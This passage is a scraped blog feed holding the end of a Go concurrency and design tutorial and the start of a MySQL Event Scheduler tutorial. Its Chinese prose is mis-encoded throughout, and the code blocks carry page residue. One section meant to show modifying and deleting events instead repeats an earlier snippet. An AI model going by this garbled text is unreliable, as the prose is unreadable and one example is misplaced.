	<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		wg.Wait()
		<span class="hljs-built_in">close</span>(done)
	}()

	<span class="hljs-keyword">select</span> {
	<span class="hljs-keyword">case</span> &lt;-done:
		fmt.Println(<span class="hljs-string">"All tasks completed successfully."</span>)
	<span class="hljs-keyword">case</span> &lt;-ctx.Done():
		fmt.Println(<span class="hljs-string">"Canceled due to timeout:"</span>, ctx.Err())
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(ctx context.Context, workerID <span class="hljs-type">int</span>, tasks &lt;-<span class="hljs-keyword">chan</span> Task)</span></span> {
	<span class="hljs-keyword">for</span> {
		<span class="hljs-keyword">select</span> {
		<span class="hljs-keyword">case</span> &lt;-ctx.Done():
			<span class="hljs-comment">// æ•è·ä¸Šä¸‹æ–‡å–æ¶ˆä¿¡å·ï¼Œç«‹å³è¿”å›ï¼Œé‡Šæ”¾èµ„æº</span>
			<span class="hljs-keyword">return</span>
		<span class="hljs-keyword">case</span> task, ok := &lt;-tasks:
			<span class="hljs-keyword">if</span> !ok {
				<span class="hljs-keyword">return</span>
			}
			<span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
			time.Sleep(<span class="hljs-number">100</span> * time.Millisecond)
			fmt.Printf(<span class="hljs-string">"Worker %d processed Task %d\n"</span>, workerID, task.ID)
		}
	}
}
</code></pre>
<p>è¿™æ®µä»£ç å±•ç¤ºäº†æ¶æ„è®¾è®¡çš„æ ¸å¿ƒæ€æƒ³ï¼š<strong>èµ„æºéš”ç¦»</strong>ã€‚é€šè¿‡ç¼“å†²é€šé“å’Œå›ºå®šæ•°é‡çš„ Workerï¼Œæˆ‘ä»¬å°†æ— é™çš„è¯·æ±‚è½¬åŒ–ä¸ºæœ‰é™çš„å¤„ç†èƒ½åŠ›ï¼Œè¿™æ˜¯æ„å»ºé«˜å¯ç”¨æœåŠ¡çš„ç¬¬ä¸€æ­¥ã€‚</p>
<h2 data-id="heading-1">äºŒã€ æ€§èƒ½ä¼˜åŒ–çš„åˆ©å‰‘ï¼šæ·±å…¥ç†è§£å†…å­˜ç®¡ç†</h2>
<p>Go çš„åƒåœ¾å›æ”¶ï¼ˆGCï¼‰æœºåˆ¶éå¸¸ä¼˜ç§€ï¼Œä½†åœ¨é«˜æ€§èƒ½åœºæ™¯ï¼ˆå¦‚ç½‘å…³ã€å®æ—¶è®¡ç®—ï¼‰ä¸‹ï¼Œé¢‘ç¹çš„å†…å­˜åˆ†é…å’Œ GC å‹åŠ›ä¾ç„¶æ˜¯æ€§èƒ½ç“¶é¢ˆã€‚è¿›é˜¶ä¸“å®¶å¿…é¡»å…·å¤‡â€œå‡å°‘å†…å­˜åˆ†é…â€çš„ç›´è§‰ï¼Œå¹¶ç†Ÿç»ƒä½¿ç”¨Â <code>sync.Pool</code>Â æ¥å¤ç”¨å¯¹è±¡ï¼Œå‡å°‘å †å†…å­˜å‹åŠ›ã€‚</p>
<p><strong>å®æˆ˜ä»£ç  2ï¼šä½¿ç”¨ sync.Pool ä¼˜åŒ–é«˜é¢‘å¯¹è±¡åˆ›å»º</strong></p>
<p>go</p>
<p>å¤åˆ¶</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"bytes"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"sync"</span>
)

<span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ± ï¼Œç”¨äºå¤ç”¨ bytes.Buffer å¯¹è±¡</span>
<span class="hljs-comment">// bytes.Buffer åœ¨ç½‘ç»œç¼–ç¨‹ï¼ˆå¦‚ HTTP å“åº”æ‹¼æ¥ï¼‰ä¸­åˆ›å»ºæå…¶é¢‘ç¹</span>
<span class="hljs-keyword">var</span> bufferPool = sync.Pool{
	New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>{} {
		<span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(bytes.Buffer)
	},
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processData</span><span class="hljs-params">(data <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
	<span class="hljs-comment">// ä»æ± ä¸­è·å–å¯¹è±¡</span>
	buf := bufferPool.Get().(*bytes.Buffer)
	buf.Reset() <span class="hljs-comment">// é‡ç½®çŠ¶æ€ï¼Œé˜²æ­¢è„æ•°æ®</span>

	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		<span class="hljs-comment">// å…³é”®ï¼šå¤„ç†å®Œæ¯•åå°†å¯¹è±¡æ”¾å›æ± ä¸­ï¼Œè€Œä¸æ˜¯ä¸¢å¼ƒ</span>
		bufferPool.Put(buf)
	}()

	<span class="hljs-comment">// æ¨¡æ‹Ÿå¤æ‚çš„ buffer å†™å…¥æ“ä½œ</span>
	buf.WriteString(<span class="hljs-string">"Processed: "</span>)
	buf.WriteString(data)
	<span class="hljs-comment">// å‡è®¾è¿™é‡Œè¿˜æœ‰å¾ˆå¤šå†™å…¥é€»è¾‘...</span>

	<span class="hljs-keyword">return</span> buf.String()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ {
		result := processData(fmt.Sprintf(<span class="hljs-string">"Data-%d"</span>, i))
		fmt.Println(result)
	}
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>sync.Pool</code>Â çš„ä½¿ç”¨ä½“ç°äº† Go ä¸“å®¶å¯¹å†…å­˜åˆ†é…å‘¨æœŸçš„ç²¾å‡†æ§åˆ¶ã€‚å¯¹äºæ¯ç§’å¤„ç†æ•°ä¸‡ç”šè‡³æ•°åä¸‡è¯·æ±‚çš„ç½‘å…³æœåŠ¡æ¥è¯´ï¼Œè¿™æ ·çš„ä¼˜åŒ–å¯ä»¥å°† CPU çš„ GC æ—¶é—´ï¼ˆGC Pauseï¼‰é™ä½ä¸€ä¸ªæ•°é‡çº§ã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€ æ¶æ„è®¾è®¡çš„å¿ƒæ³•ï¼šæ¥å£ä¸ä¾èµ–æ³¨å…¥</h2>
<p>ä»ä»£ç å¼€å‘èµ°å‘æ¶æ„è®¾è®¡ï¼Œæœ€å¤§çš„è·¨è¶Šåœ¨äºâ€œè§£è€¦â€ã€‚Go è¯­è¨€ä¸­çš„Â <code>interface</code>Â æ˜¯å®ç°ä¾èµ–å€’ç½®åŸåˆ™ï¼ˆDIPï¼‰çš„ç¥å™¨ã€‚ä¸“å®¶çº§çš„æ¶æ„è®¾è®¡ï¼Œæ€»æ˜¯é€šè¿‡æ¥å£æ¥å®šä¹‰è¡Œä¸ºï¼Œè€Œä¸æ˜¯ä¾èµ–å…·ä½“å®ç°ã€‚è¿™ä½¿å¾—æˆ‘ä»¬çš„ç³»ç»Ÿåœ¨æµ‹è¯•æ—¶å¯ä»¥è½»æ¾æ³¨å…¥ Mock å¯¹è±¡ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯ä»¥çµæ´»åˆ‡æ¢åº•å±‚å­˜å‚¨ï¼ˆå¦‚ä» MySQL åˆ‡æ¢åˆ° PostgreSQLï¼‰ã€‚</p>
<p><strong>å®æˆ˜ä»£ç  3ï¼šåŸºäºæ¥å£çš„å¯æ‰©å±•ä»“å‚¨æ¨¡å¼</strong></p>
<p>go</p>
<p>å¤åˆ¶</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-comment">// 1. å®šä¹‰æŠ½è±¡å±‚ï¼šRepository æ¥å£</span>
<span class="hljs-comment">// æ¶æ„è®¾è®¡çš„å…³é”®åœ¨äºâ€œé¢å‘æ¥å£ç¼–ç¨‹â€</span>
<span class="hljs-keyword">type</span> UserRepository <span class="hljs-keyword">interface</span> {
	GetUser(id <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)
}

<span class="hljs-comment">// 2. å®ç°å…·ä½“å±‚ Aï¼šMySQL å®ç°</span>
<span class="hljs-keyword">type</span> MySQLUserRepo <span class="hljs-keyword">struct</span>{}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *MySQLUserRepo)</span></span> GetUser(id <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
	<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">"MySQL User %d"</span>, id), <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// 3. å®ç°å…·ä½“å±‚ Bï¼šMock å®ç°ï¼ˆç”¨äºå•å…ƒæµ‹è¯•ï¼‰</span>
<span class="hljs-keyword">type</span> MockUserRepo <span class="hljs-keyword">struct</span>{}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *MockUserRepo)</span></span> GetUser(id <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
	<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">"Mock User %d"</span>, id), <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// 4. ä¸šåŠ¡é€»è¾‘å±‚ï¼šService</span>
<span class="hljs-comment">// Service ä¾èµ–æ¥å£ï¼Œä¸ä¾èµ–å…·ä½“å®ç°ï¼Œä»è€Œå®ç°äº†é«˜åº¦è§£è€¦</span>
<span class="hljs-keyword">type</span> UserService <span class="hljs-keyword">struct</span> {
	repo UserRepository
}

<span class="hljs-comment">// æ„é€ å‡½æ•°æ³¨å…¥</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewUserService</span><span class="hljs-params">(repo UserRepository)</span></span> *UserService {
	<span class="hljs-keyword">return</span> &amp;UserService{repo: repo}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *UserService)</span></span> PrintUserInfo(id <span class="hljs-type">int</span>) {
	user, err := s.repo.GetUser(id)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span>
	}
	fmt.Println(user)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	<span class="hljs-comment">// çœŸå®åœºæ™¯</span>
	mysqlRepo := &amp;MySQLUserRepo{}
	service := NewUserService(mysqlRepo)
	service.PrintUserInfo(<span class="hljs-number">100</span>)

	<span class="hljs-comment">// æ¨¡æ‹Ÿæµ‹è¯•åœºæ™¯ï¼Œæ— éœ€ä¿®æ”¹ Service ä»£ç </span>
	mockRepo := &amp;MockUserRepo{}
	testService := NewUserService(mockRepo)
	testService.PrintUserInfo(<span class="hljs-number">999</span>)
}
</code></pre>
<h2 data-id="heading-3">å››ã€ æ€»ç»“</h2>
<p>Go è¯­è¨€çš„é—¨æ§›çœ‹ä¼¼å¾ˆä½ï¼Œä½†è¦â€œç²¾é€šâ€ï¼Œåˆ™éœ€è¦æ·±åšçš„å†…åŠŸã€‚ä»å¹¶å‘æ¨¡å‹ä¸‹çš„èµ„æºæ§åˆ¶ï¼Œåˆ°å†…å­˜ç®¡ç†ä¸­çš„å¯¹è±¡å¤ç”¨ï¼Œå†åˆ°æ¶æ„å±‚é¢çš„æ¥å£æŠ½è±¡ï¼Œæ¯ä¸€æ­¥éƒ½ä½“ç°äº†å·¥ç¨‹åŒ–æ€ç»´çš„ä¸¥è°¨æ€§ã€‚</p>
<p>è¿™æ¬¡è¿›é˜¶è¥è®©æˆ‘æ˜ç™½ï¼ŒçœŸæ­£çš„ä¸“å®¶ä¸æ˜¯ä»£ç å†™å¾—æœ€å¿«çš„äººï¼Œè€Œæ˜¯èƒ½å†™å‡º<strong>å¯ç»´æŠ¤ã€é«˜æ€§èƒ½ã€æ˜“æ‰©å±•</strong>ä»£ç çš„äººã€‚å¸Œæœ›åœ¨æœªæ¥çš„æŠ€æœ¯ä¹‹è·¯ä¸Šï¼Œæˆ‘ä»¬éƒ½èƒ½ä¿æŒè¿™ç§æ·±ç©¶åŸç†ã€ç²¾ç›Šæ±‚ç²¾çš„æå®¢ç²¾ç¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQLå®šæ—¶ä»»åŠ¡è¯¦è§£ - Event Scheduler äº‹ä»¶è°ƒåº¦å™¨ä»åŸºç¡€åˆ°å®æˆ˜]]></title>    <link>https://juejin.cn/post/7588844115318472756</link>    <guid>https://juejin.cn/post/7588844115318472756</guid>    <pubDate>2025-12-29T06:56:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588844115318472756" data-draft-id="7588971908227170338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQLå®šæ—¶ä»»åŠ¡è¯¦è§£ - Event Scheduler äº‹ä»¶è°ƒåº¦å™¨ä»åŸºç¡€åˆ°å®æˆ˜"/> <meta itemprop="keywords" content="åç«¯,MySQL"/> <meta itemprop="datePublished" content="2025-12-29T06:56:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaæ°´è§£"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQLå®šæ—¶ä»»åŠ¡è¯¦è§£ - Event Scheduler äº‹ä»¶è°ƒåº¦å™¨ä»åŸºç¡€åˆ°å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaæ°´è§£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:56:48.000Z" title="Mon Dec 29 2025 06:56:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å‰è¨€</h2>
<p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°â€œ<strong>å®šæ—¶æ‰§è¡Œä»»åŠ¡</strong>â€çš„éœ€æ±‚ï¼Œæ¯”å¦‚æ¯å¤©<strong>å‡Œæ™¨æ¸…ç†å†å²æ•°æ®ã€å®šæ—¶å½’æ¡£æ—¥å¿—ã€å®šæœŸç»Ÿè®¡æŠ¥è¡¨æ±‡æ€»</strong>ç­‰ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©Â ä»»åŠ¡è°ƒåº¦å™¨ æ¥å®ç°ï¼Œä¾‹å¦‚Â <strong>Quartzã€xxl-jobã€Crontab</strong>ã€‚ä½†å…¶å®ï¼Œ<code>MySQL</code>Â è‡ªèº«ä¹Ÿå†…ç½®äº†å®šæ—¶ä»»åŠ¡ï¼ˆ<code>Event Scheduler</code>ï¼‰åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥åœ¨æ•°æ®åº“å±‚é¢å®ç°è°ƒåº¦ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec9d8207fbb4b6484124143ad18eedd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596208&amp;x-signature=LvQowKYCjcHqjaHvGSyllE%2Bb83A%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è™½ç„¶<code>MySQL</code>è‡ªèº«ä¹Ÿå†…ç½®äº†å®šæ—¶ä»»åŠ¡éé¡¹ç›®ä¸­å¸¸ç”¨ï¼Œä½†æ˜¯äº†è§£æŒæ¡è¿™é—¨æŠ€æœ¯è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œåœ¨ä¸€äº›æç®€åŠŸèƒ½é¡¹ç›®ï¼Œæˆ–è®¸ä½ ä¼šç”¨åˆ°å®ƒï¼Œæœ¬æ–‡åšä¸»å°†å¸¦å°ä¼™ä¼´äº†è§£Â <code>MySQL å®šæ—¶ä»»åŠ¡</code>Â çš„ä½¿ç”¨æ–¹æ³•ï¼Œé€šè¿‡ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹æ¥å®è·µã€‚</p>
<hr/>
<h2 data-id="heading-1"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. ä¸ºä»€ä¹ˆä½¿ç”¨Â MySQLÂ å®šæ—¶ä»»åŠ¡ï¼Ÿ</h2>
<p>MySQLä»5.1.6ç‰ˆæœ¬å¼€å§‹<strong>å†…ç½®äº†äº‹ä»¶è°ƒåº¦å™¨ï¼ˆEvent Schedulerï¼‰</strong> ï¼Œå…è®¸åœ¨æ•°æ®åº“å†…éƒ¨åˆ›å»ºå®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œæ— éœ€å¤–éƒ¨åº”ç”¨ä»‹å…¥</p>
<p><strong>å…¸å‹åœºæ™¯ï¼š</strong></p>
<ul>
<li>å®šæ—¶æ¸…ç†è¿‡æœŸæ•°æ®ï¼ˆå¦‚ç”¨æˆ·ä¸´æ—¶è¡¨ã€æ—¥å¿—è¡¨ï¼‰</li>
<li>å®šæ—¶ç”Ÿæˆç»Ÿè®¡æŠ¥è¡¨å¹¶å†™å…¥æ±‡æ€»è¡¨</li>
<li>å®šæ—¶å½’æ¡£æ•°æ®ï¼ˆå†·æ•°æ®è½¬å­˜ï¼‰</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<blockquote>
<p>æ— éœ€é¢å¤–ä¾èµ–ç¬¬ä¸‰æ–¹ä»»åŠ¡è°ƒåº¦æ¡†æ¶ï¼›<br/>
ä¸æ•°æ®åº“è€¦åˆï¼Œæ‰§è¡Œæ•ˆç‡è¾ƒé«˜ï¼›<br/>
ä»»åŠ¡å­˜å‚¨åœ¨ MySQL å†…éƒ¨ï¼Œè·¨æœåŠ¡éƒ¨ç½²ä¹Ÿèƒ½ä¿è¯æ‰§è¡Œï¼›</p>
</blockquote>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<blockquote>
<p>çµæ´»æ€§ä¸å¦‚ Quartz ç­‰ä¸“ä¸šä»»åŠ¡è°ƒåº¦æ¡†æ¶ï¼›<br/>
ä»»åŠ¡æ‰§è¡Œä¾èµ– MySQL çš„ç¨³å®šæ€§ï¼ˆæ•°æ®åº“æŒ‚äº†ï¼Œä»»åŠ¡ä¹Ÿæ— æ³•æ‰§è¡Œï¼‰ï¼›<br/>
ç¼ºä¹å¤æ‚çš„ä»»åŠ¡ç®¡ç†ä¸ç›‘æ§ï¼ˆéœ€è¦æ‰‹å·¥å®ç°æ—¥å¿—ï¼‰ï¼›</p>
</blockquote>
<hr/>
<h2 data-id="heading-2"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3. MySQL å®šæ—¶ä»»åŠ¡çš„åŸºæœ¬è¯­æ³•</h2>
<p>åœ¨ä½¿ç”¨å‰ï¼Œéœ€è¦ç¡®è®¤äº‹ä»¶è°ƒåº¦å™¨æ˜¯å¦å¼€å¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æŸ¥çœ‹äº‹ä»¶è°ƒåº¦å™¨æ˜¯å¦å¼€å¯
SHOW VARIABLES LIKE 'event_scheduler'<span class="hljs-comment">;</span>

-- å¦‚æœä¸º OFFï¼Œå¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯ï¼ˆä¸´æ—¶ç”Ÿæ•ˆï¼‰
SET GLOBAL <span class="hljs-attr">event_scheduler</span> = <span class="hljs-literal">ON</span><span class="hljs-comment">;</span>

-- æ°¸ä¹…ç”Ÿæ•ˆï¼ˆä¿®æ”¹ my.cnf é…ç½®ï¼‰
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">event_scheduler</span>=<span class="hljs-literal">ON</span>

AIå†™ä»£ç sql
123456789
</code></pre>
<p>æ ¸å¿ƒè¯­æ³•</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EVENT [IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span>] äº‹ä»¶åç§°
<span class="hljs-keyword">ON</span> SCHEDULE
    schedule_expression <span class="hljs-comment">-- è°ƒåº¦æ—¶é—´è®¾ç½®</span>
[<span class="hljs-keyword">ON</span> COMPLETION [<span class="hljs-keyword">NOT</span>] PRESERVE] <span class="hljs-comment">-- æ‰§è¡Œåæ˜¯å¦ä¿ç•™</span>
[ENABLE <span class="hljs-operator">|</span> DISABLE <span class="hljs-operator">|</span> DISABLE <span class="hljs-keyword">ON</span> SLAVE] <span class="hljs-comment">-- çŠ¶æ€</span>
DO
    event_body; <span class="hljs-comment">-- æ‰§è¡Œçš„SQLæˆ–å­˜å‚¨è¿‡ç¨‹</span>

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">1234567</span>
</code></pre>
<h4 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>æ—¶é—´è°ƒåº¦è¡¨è¾¾å¼</h4>
<p><strong>ä¸€æ¬¡æ€§ä»»åŠ¡ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ON</span> SCHEDULE <span class="hljs-keyword">AT</span> <span class="hljs-type">TIMESTAMP</span> <span class="hljs-string">'2025-08-18 10:00:00'</span>

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">1</span>
</code></pre>
<p><strong>é‡å¤æ‰§è¡Œä»»åŠ¡ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ON</span> SCHEDULE <span class="hljs-keyword">EVERY</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>
STARTS <span class="hljs-type">TIMESTAMP</span> <span class="hljs-string">'2025-08-18 00:00:00'</span>
ENDS <span class="hljs-type">TIMESTAMP</span> <span class="hljs-string">'2025-08-31 23:59:59'</span>

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
<span class="hljs-number">123</span>
</code></pre>
<h4 data-id="heading-4"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>ä¿®æ”¹ä¸åˆ é™¤</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ON</span> SCHEDULE <span class="hljs-keyword">EVERY</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>
STARTS <span class="hljs-type">TIMESTAMP</span> <span class="hljs-string">'2025-08-18 00:00:00'</span>
ENDS <span class="hljs-type">TIMESTAMP</span> <span class="hljs-string">'2025-08-31 23:59:59'</span>

AIå†™ä»£ç <span class="hljs-keyword">sql</span>
